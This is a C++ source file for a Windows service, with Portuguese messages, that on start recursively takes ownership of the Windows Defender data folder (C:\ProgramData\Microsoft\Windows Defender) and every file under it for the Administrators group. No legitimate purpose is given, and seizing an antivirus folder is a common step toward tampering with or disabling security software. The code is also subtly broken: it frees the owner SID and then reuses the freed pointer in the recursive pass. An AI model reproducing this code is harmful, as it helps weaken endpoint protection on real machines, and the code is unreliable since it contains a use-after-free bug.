#include <Windows.h>
#include <Aclapi.h>
#include <iostream>
#include <tchar.h>
#include <Shlwapi.h>

HANDLE serviceStopEvent = nullptr;

void RecursivelyChangeOwner(LPCTSTR folderPath, PSID pNewOwnerSID);

void ChangeOwnerRecursively() {
    const LPCTSTR objectName = L"C:\\ProgramData\\Microsoft\\Windows Defender";
    const LPCTSTR newOwner = L"Administradores";
    PSID pNewOwnerSID = nullptr;
    SID_NAME_USE sidType;

    DWORD dwSIDSize = 0;
    DWORD dwDomainNameSize = 0;
    LookupAccountName(nullptr, newOwner, pNewOwnerSID, &dwSIDSize, nullptr, &dwDomainNameSize, &sidType);
    pNewOwnerSID = (PSID)LocalAlloc(LPTR, dwSIDSize);

    TCHAR domainName[MAX_PATH];
    dwDomainNameSize = MAX_PATH;
    if (!LookupAccountName(nullptr, newOwner, pNewOwnerSID, &dwSIDSize, domainName, &dwDomainNameSize, &sidType)) {
        std::wcerr << L"Erro ao obter o SID do novo proprietário. Código de erro: " << GetLastError() << std::endl;
        LocalFree(pNewOwnerSID);
        return;
    }

    DWORD dwResult = SetNamedSecurityInfo(
        const_cast<LPTSTR>(objectName),
        SE_FILE_OBJECT,
        OWNER_SECURITY_INFORMATION,
        pNewOwnerSID,
        nullptr,
        nullptr,
        nullptr
    );

    LocalFree(pNewOwnerSID);

    if (dwResult == ERROR_SUCCESS) {
        std::wcout << L"O proprietário foi alterado com sucesso!" << std::endl;
    }
    else {
        std::wcerr << L"Erro ao alterar o proprietário. Código de erro: " << dwResult << std::endl;
    }

    RecursivelyChangeOwner(objectName, pNewOwnerSID);
}

void RecursivelyChangeOwner(LPCTSTR folderPath, PSID pNewOwnerSID) {
    WIN32_FIND_DATA findData;
    TCHAR searchPath[MAX_PATH];
    _tcscpy_s(searchPath, folderPath);
    _tcscat_s(searchPath, _T("\\*.*"));

    HANDLE hFind = FindFirstFile(searchPath, &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (_tcscmp(findData.cFileName, _T(".")) != 0 && _tcscmp(findData.cFileName, _T("..")) != 0) {
                TCHAR itemPath[MAX_PATH];
                _tcscpy_s(itemPath, folderPath);
                _tcscat_s(itemPath, _T("\\"));
                _tcscat_s(itemPath, findData.cFileName);

                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    RecursivelyChangeOwner(itemPath, pNewOwnerSID);
                }

                DWORD dwResult = SetNamedSecurityInfo(
                    const_cast<LPTSTR>(itemPath),
                    SE_FILE_OBJECT,
                    OWNER_SECURITY_INFORMATION,
                    pNewOwnerSID,
                    nullptr,
                    nullptr,
                    nullptr
                );

                if (dwResult != ERROR_SUCCESS) {
                    std::wcerr << L"Erro ao alterar as informações de segurança para " << itemPath << L". Código de erro: " << dwResult << std::endl;
                }
            }
        } while (FindNextFile(hFind, &findData) != 0);

        FindClose(hFind);
    }
}

VOID WINAPI ServiceCtrlHandler(DWORD ctrlCode) {
    switch (ctrlCode) {
    case SERVICE_CONTROL_STOP:
        SetEvent(serviceStopEvent);
        break;
    default:
        break;
    }
}

VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
    SERVICE_STATUS serviceStatus = { 0 };
    SERVICE_STATUS_HANDLE serviceStatusHandle = RegisterServiceCtrlHandler(TEXT("NomeDoServico"), (LPHANDLER_FUNCTION)ServiceCtrlHandler);
    if (serviceStatusHandle == nullptr) {
        return;
    }

    serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    serviceStatus.dwCurrentState = SERVICE_START_PENDING;
    serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;

    SetServiceStatus(serviceStatusHandle, &serviceStatus);

    ChangeOwnerRecursively();

    serviceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(serviceStatusHandle, &serviceStatus);

    WaitForSingleObject(serviceStopEvent, INFINITE);

    serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
    SetServiceStatus(serviceStatusHandle, &serviceStatus);

    serviceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(serviceStatusHandle, &serviceStatus);
}

int main() {
    serviceStopEvent = CreateEvent(nullptr, TRUE, FALSE, nullptr);
    if (serviceStopEvent == nullptr) {
        std::wcerr << L"Erro ao criar o evento para o serviço. Código de erro: " << GetLastError() << std::endl;
        return 1;
    }

    SERVICE_TABLE_ENTRY serviceTable[] = {
        { (LPWSTR)L"NomeDoServico", (LPSERVICE_MAIN_FUNCTIONW)ServiceMain },
        { nullptr, nullptr }
    };

    if (!StartServiceCtrlDispatcher(serviceTable)) {
        std::wcerr << L"Erro ao iniciar o serviço. Código de erro: " << GetLastError() << std::endl;
        CloseHandle(serviceStopEvent);
        return 1;
    }

    CloseHandle(serviceStopEvent);

    return 0;
}
